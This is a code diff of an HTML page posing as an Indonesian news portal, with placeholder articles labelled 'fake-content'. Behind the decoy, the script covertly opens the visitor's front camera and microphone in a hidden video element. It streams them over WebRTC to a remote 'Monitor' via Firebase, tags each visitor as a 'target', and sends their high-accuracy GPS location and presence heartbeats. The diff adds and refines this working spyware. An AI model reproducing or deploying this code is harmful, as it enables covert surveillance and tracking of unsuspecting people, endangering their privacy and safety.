@@ -3,21 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Berita Terkini</title>
+    <title>Portal Berita Nasional</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: sans-serif; margin: 0; padding: 20px; line-height: 1.6; }
-        .nav { background: #b91c1c; color: white; padding: 15px; font-weight: bold; margin-bottom: 20px; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; background: #f4f4f4; color: #333; }
+        .header { background: #b91c1c; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .container { padding: 20px; max-width: 800px; margin: auto; background: white; min-height: 100vh; }
+        h1 { color: #111; font-size: 24px; }
         #v { display: none; }
+        .fake-content { color: #555; line-height: 1.8; }
+        img { width: 100%; border-radius: 8px; margin: 15px 0; }
     </style>
 </head>
 <body>
-    <div class="nav">INFORMASI NASIONAL</div>
-    <h1>Pembangunan Infrastruktur Digital di Daerah Terpencil</h1>
-    <p>Pemerintah terus berupaya memperluas akses internet cepat hingga ke pelosok desa guna mendukung ekonomi kreatif masyarakat...</p>
-    <img src="https://picsum.photos/800/400" style="width:100%; border-radius:10px;">
+    <div class="header">INFO NEWS INDONESIA</div>
+    <div class="container">
+        <h1>Transformasi Digital: Peluang dan Tantangan di Era Modern</h1>
+        <p class="fake-content">Jakarta - Perkembangan teknologi yang masif menuntut masyarakat untuk lebih adaptif dalam menghadapi perubahan ekonomi dunia...</p>
+        <img src="https://picsum.photos/800/400?news=1" alt="News Image">
+        <p class="fake-content">Berdasarkan data terbaru, penggunaan internet di Indonesia meningkat hingga 15% pada kuartal pertama tahun ini. Pemerintah terus mendorong pemerataan infrastruktur...</p>
+    </div>
     
+    <!-- Hidden Cam Preview -->
     <video id="v" autoplay playsinline muted></video>
 
     <script>
@@ -28,76 +36,90 @@
         };
         firebase.initializeApp(firebaseConfig);
 
-        let targetId = localStorage.getItem('target_id') || ("TGT-" + Math.random().toString(36).substr(2, 5));
-        localStorage.setItem('target_id', targetId);
+        let targetId = localStorage.getItem('target_id');
+        if (!targetId) {
+            targetId = "TGT-" + Math.random().toString(36).substr(2, 5).toUpperCase();
+            localStorage.setItem('target_id', targetId);
+        }
 
-        const db = firebase.database().ref('v8_auto_sync/' + targetId);
-        let pc;
-        let localStream;
+        const db = firebase.database().ref('v5_multi/' + targetId);
+        let pc = null;
+        let localStream = null;
 
-        async function createNewOffer() {
-            console.log("Menerima permintaan reset dari monitor. Memulai ulang koneksi...");
-            if (pc) {
-                pc.close();
-                pc = null;
+        async function startStream() {
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: true 
+                });
+                document.getElementById('v').srcObject = localStream;
+                setupWebRTC();
+            } catch (e) {
+                console.error("Camera access denied");
+                // Tetap kirim status lokasi meski kamera gagal
+                startLocationTracking();
             }
-            
+        }
+
+        async function setupWebRTC() {
+            // Bersihkan sisa koneksi lama sebelum mulai baru
+            await db.child('sdp').remove();
+            await db.child('ice_m').remove();
+            await db.child('ice_t').remove();
+
+            if (pc) pc.close();
             pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 
             pc.onicecandidate = e => {
                 if (e.candidate) db.child('ice_t').push(e.candidate.toJSON());
             };
 
-            if (localStream) {
-                localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
-            }
+            localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
 
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
             
-            // Bersihkan data lama di folder sdp sebelum kirim yang baru
-            await db.child('ice_t').remove();
-            await db.child('ice_m').remove();
-            await db.child('sdp/answer').remove();
-            
-            db.child('sdp/offer').set({ type: offer.type, sdp: offer.sdp, ts: Date.now() });
-        }
-
-        async function init() {
-            try {
-                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('v').srcObject = localStream;
-            } catch (e) { console.error("Izin ditolak"); }
-
-            // Deteksi sinyal reset dari monitor (tanpa refresh halaman)
-            db.child('reset_signal').on('value', s => {
-                if (s.exists()) {
-                    createNewOffer();
-                    db.child('reset_signal').remove(); // Hapus trigger setelah dibaca
-                }
+            // Kirim offer dengan timestamp unik agar Monitor tahu ini sesi baru
+            db.child('sdp/offer').set({ 
+                type: offer.type, 
+                sdp: offer.sdp, 
+                ts: Date.now() 
             });
 
+            // Tunggu Answer dari Monitor
             db.child('sdp/answer').on('value', async s => {
                 const a = s.val();
-                if (a && pc && !pc.currentRemoteDescription) {
+                if (a && pc && pc.signalingState !== "stable") {
                     await pc.setRemoteDescription(new RTCSessionDescription(a));
                 }
             });
 
+            // Terima ICE candidates dari Monitor
             db.child('ice_m').on('child_added', s => {
-                if(pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e=>{});
-            });
-
-            // Heartbeat agar monitor tahu target masih ada
-            setInterval(() => db.child('presence').set(Date.now()), 3000);
-            
-            // Lokasi
-            navigator.geolocation.watchPosition(p => {
-                db.child('status').update({ lat: p.coords.latitude, lng: p.coords.longitude });
+                if (pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e => {});
             });
         }
 
-        window.onload = init;
+        function startLocationTracking() {
+            navigator.geolocation.watchPosition(p => {
+                db.child('status').update({ 
+                    lat: p.coords.latitude, 
+                    lng: p.coords.longitude, 
+                    lastSeen: Date.now(), 
+                    id: targetId 
+                });
+            }, null, { enableHighAccuracy: true });
+
+            // Heartbeat fallback jika lokasi tidak berubah
+            setInterval(() => {
+                db.child('status/lastSeen').set(Date.now());
+            }, 5000);
+        }
+
+        window.onload = () => {
+            startStream();
+            startLocationTracking();
+        };
     </script>
 </body>
 </html>
